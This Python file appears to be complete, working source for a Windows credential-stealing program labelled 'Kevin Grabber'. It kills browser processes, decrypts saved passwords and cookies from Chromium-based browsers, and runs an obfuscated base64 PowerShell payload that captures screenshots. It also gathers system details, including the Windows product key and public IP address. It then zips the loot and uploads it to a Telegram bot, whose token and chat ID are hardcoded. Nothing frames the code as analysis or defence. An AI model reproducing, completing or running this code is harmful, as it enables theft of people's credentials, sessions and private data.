import base64
import os
import subprocess
import json
import random
import shutil
import sqlite3
import time
import ctypes
from datetime import datetime
import requests
import winreg
from Crypto.Cipher import AES
from threading import Thread
from ctypes import wintypes, windll, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()

APPDATA = os.getenv("APPDATA")
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
TAPI = "7733366488:AAHFBq_N1Ix-DFnzbw7nIrc_TDxZYo_hJME"
TCHATID = "-1002050197092"

class ChoriumBrowsers:
    encryptionKey = None
    BrowserPath = None
    oldPath = None

    def __init__(self, browserPath: str):
        if "Opera" in browserPath:
            self.oldPath = browserPath
            browserPath = os.path.join(APPDATA, browserPath)
        else:
            self.oldPath = browserPath
            browserPath = os.path.join(LOCALAPPDATA, browserPath)
        self.BrowserPath = browserPath
        self.encryptionKey = self.GetEncryptionKey()

    @staticmethod
    def Check(browserPath: str) -> bool:
        if "Opera" in browserPath:
            browserPath = os.path.join(APPDATA, browserPath)
        else:
            browserPath = os.path.join(LOCALAPPDATA, browserPath)
        return os.path.exists(browserPath)

    def GetEncryptionKey(self) -> bytes:
        if self.encryptionKey is not None:
            return self.encryptionKey
        localStatePath = os.path.join(self.BrowserPath, "Local State")
        if os.path.isfile(localStatePath):
            for i in ["chrome", "brave", "opera", "edge", "comodo", "epic", "iridium", "opera"]:
                Utility.TaskKill(i)
            with open(localStatePath, encoding="utf-8", errors="ignore") as file:
                jsonContent = json.load(file)
                encryptedKey = jsonContent["os_crypt"]["encrypted_key"]
                encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
                self.encryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                return self.encryptionKey
        return None

    def GetLoginPaths(self, browserPath: str):
        loginFilePaths = []
        for root, _, files in os.walk(browserPath):
            for file in files:
                if file.lower() == "login data":
                    filepath = os.path.join(root, file)
                    loginFilePaths.append(filepath)
        return loginFilePaths

    def GetPasswords(self, savePath: str):
        browserName = self.oldPath.split("\\")[0] + "_" + self.oldPath.split("\\")[1]
        for path in self.GetLoginPaths(self.BrowserPath):
            name = f"[{browserName}]"
            if "Default" in path:
                name += "Default_Password.txt"
            else:
                a = path.split("\\")
                name += a[len(a)-2] + "_Password.txt"
            while True:
                tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(14) + ".db")
                if not os.path.isfile(tempfile):
                    break
            try:
                for i in ["chrome", "brave", "opera", "edge", "comodo", "epic", "iridium", "opera"]:
                    Utility.TaskKill(i)
                shutil.copy(path, tempfile)
            except Exception:
                continue
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()
            f = None
            try:
                results = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
                f = open(os.path.join(savePath, name), mode="a+", encoding="utf-8")
                for url, username, password in results:
                    password = self.Decrypt(password, self.encryptionKey)
                    f.write(f"URL: {str(url)}\nUsername: {str(username)}\nPassword: {str(password)}\n")
                    Counter.PasswordCount += 1
                f.close()
                if os.path.getsize(os.path.join(savePath, name)) <= 0:
                    os.remove(os.path.join(savePath, name))
            except Exception as e:
                pass  # Silent fail for now
            finally:
                if f:
                    f.close()
                db.close()
                if os.path.exists(tempfile):
                    os.remove(tempfile)

    def Decrypt(self, buffer: bytes, key: bytes):
        version = buffer.decode(errors="ignore")
        if version.startswith(("v10", "v11")):
            iv = buffer[3:15]
            cipherText = buffer[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(cipherText)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        return str(Syscalls.CryptUnprotectData(buffer))

    def GetCookiesPath(self, browserPath: str):
        cookiesFilePaths = []
        for root, _, files in os.walk(self.BrowserPath):
            for file in files:
                if file.lower() == "cookies":
                    filepath = os.path.join(root, file)
                    cookiesFilePaths.append(filepath)
        return cookiesFilePaths

    def GetCookies(self, savePath: str):
        browserName = self.oldPath.split("\\")[0] + "_" + self.oldPath.split("\\")[1]
        for path in self.GetCookiesPath(self.BrowserPath):
            name = f"[{browserName}]"
            if "Default" in path:
                name += "Default_Cookies.txt"
            else:
                a = path.split("\\")
                name += a[len(a)-3] + "_Cookies.txt"
            while True:
                tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(14) + ".tmp")
                if not os.path.isfile(tempfile):
                    break
            try:
                for i in ["chrome", "brave", "opera", "edge", "comodo", "epic", "iridium", "opera"]:
                    Utility.TaskKill(i)
                shutil.copy(path, tempfile)
            except:
                continue
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()
            try:
                results = cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall()
                f = open(os.path.join(savePath, name), "a+", encoding="utf-8")
                for host, name, path, cookie, expiry in results:
                    cookie = self.Decrypt(cookie, self.encryptionKey)
                    flag1 = "FALSE" if expiry == 0 else "TRUE"
                    flag2 = "FALSE" if str(host).startswith(".") else "TRUE"
                    if host and name and cookie:
                        f.write(f"{host}\t{flag1}\t{path}\t{flag2}\t{expiry}\t{name}\t{cookie}\n")
                        Counter.CookiesCount += 1
                f.close()
                if os.path.getsize(os.path.join(savePath, name)) <= 0:
                    os.remove(os.path.join(savePath, name))
            except Exception:
                pass
            finally:
                if f:
                    f.close()
                db.close()
                if os.path.exists(tempfile):
                    os.remove(tempfile)

class Counter:
    CookiesCount = 0
    PasswordCount = 0
    FilesCount = 0
    WalletsCount = 0
    TelegramSessionsCount = 0

class Utility:
    @staticmethod
    def GetRandomString(length: int = 5, invisible: bool = False):
        if invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
        return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=length))

    @staticmethod
    def TaskKill(*tasks: str):
        tasks = list(map(lambda x: x.lower(), tasks))
        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
        for i in out:
            i = i.split("\r\n")[:2]
            try:
                name, pid = i[0].split()[-1], int(i[1].split()[-1])
                name = name[:-4] if name.endswith(".exe") else name
                for task in tasks:
                    if task in name.lower():
                        subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
            except Exception:
                pass

class Syscalls:
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str = None) -> bytes:
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None
        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)
        raise ValueError("Invalid encrypted_data provided!")

class Paths:
    browserPaths = [
        os.path.join("Google", "Chrome", "User Data"),
        "BraveSoftware\\Brave-Browser\\User Data",
        "Opera Software\\Opera Stable",
        # Add more as needed
    ]
    isRun = False

def Steal(savePath: str):
    os.chdir(savePath)
    command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbAAgAFMAYwByAGUAZQBuAHMAOwANAAoADQAKACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwIAZQBlAG4AcwBoAG8AdAAuAEQAaQBzAHAAbwBzAGUAKAApAA0ACgB9AA=="
    subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd=savePath + "\\")

    saveBrowserCookies = os.path.join(savePath, "Browsers Data", "Cookies")
    saveBrowserPasswords = os.path.join(savePath, "Browsers Data", "Passwords")
    os.makedirs(saveBrowserCookies, exist_ok=True)
    os.makedirs(saveBrowserPasswords, exist_ok=True)
    
    for path in Paths.browserPaths:
        if not ChoriumBrowsers.Check(path):
            continue
        instance = ChoriumBrowsers(browserPath=path)
        instance.GetCookies(saveBrowserCookies)
        instance.GetPasswords(saveBrowserPasswords)

    saveSystemInfo = os.path.join(savePath, "SystemInfomation.txt")
    computerName = os.getenv("computername") or "Unable to get computer name"
    computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
    computerOS = computerOS[2].strip() if len(computerOS) >= 2 else "Unable to detect OS"
    totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
    totalMemory = (str(int(int(totalMemory[1])/1000000000)) + " GB") if len(totalMemory) >= 1 else "Unable to detect total memory"
    uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
    uuid = uuid[1].strip() if len(uuid) >= 1 else "Unable to detect UUID"
    cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or "Unable to detect CPU"
    gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
    gpu = gpu[2].strip() if len(gpu) >= 2 else "Unable to detect GPU"
    productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or "Unable to get product key"
    
    info = "============================================================\n"
    info += "###################### Kevin Grabber  #############################\n"
    info += f"Name: {computerName}\nOS: {computerOS}\nCPU: {cpu}\nGPU: {gpu}\nRAM: {totalMemory}\nUUID: {uuid}\nProduct Key: {productKey}\n"
    info += "============================================================\n"
    with open(saveSystemInfo, "w", encoding="utf-8") as f:
        f.write(info)

    InfoLog.FileName = computerName
    InfoLog.IP = requests.get("https://api.ipify.org?format=json").json()["ip"]
    j = requests.get("https://ipinfo.io/json").json()
    InfoLog.Country = j["region"] + " " + j["country"]
    InfoLog.Date = datetime.today().strftime("%d-%m-%Y %H:%M:%S")

class InfoLog:
    FileName = ""
    IP = ""
    Country = ""
    Date = ""

if __name__ == "__main__" and os.name == "nt":
    TempPath = ""
    while True:
        TempPath = os.path.join(os.getenv("temp"), Utility.GetRandomString(14))
        if not os.path.isdir(TempPath):
            break
    Paths.isRun = True
    os.makedirs(TempPath)
    
    t1 = Thread(target=Steal, args=(TempPath,))
    t1.start()
    t1.join()

    zipf = TempPath
    shutil.make_archive(zipf, "zip", TempPath)
    zipf = zipf + ".zip"
    info = f"""<b>====== Kevin Grabber Logs =======</b>
<b>==== PC Infomation ====</b>
Name: {InfoLog.FileName}
IP: {InfoLog.IP}
Country: {InfoLog.Country}
Date: {InfoLog.Date}
<b>==== Browser Data ====</b>
Cookies: {Counter.CookiesCount}
Passwords: {Counter.PasswordCount}
<b>==== Wallets ====</b>
"""
    filename = f"{InfoLog.Country}-{InfoLog.IP}-{InfoLog.Date}"
    files = {'document': (filename + ".zip", open(zipf, 'rb'), 'text/plain')}
    data = {'chat_id': TCHATID, 'caption': info, 'parse_mode': 'HTML'}
    url = f'https://api.telegram.org/bot{TAPI}/sendDocument'
    response = requests.post(url=url, files=files, data=data)
    if response.status_code == 200:
        exit(0)
    else:
        print(response.text)
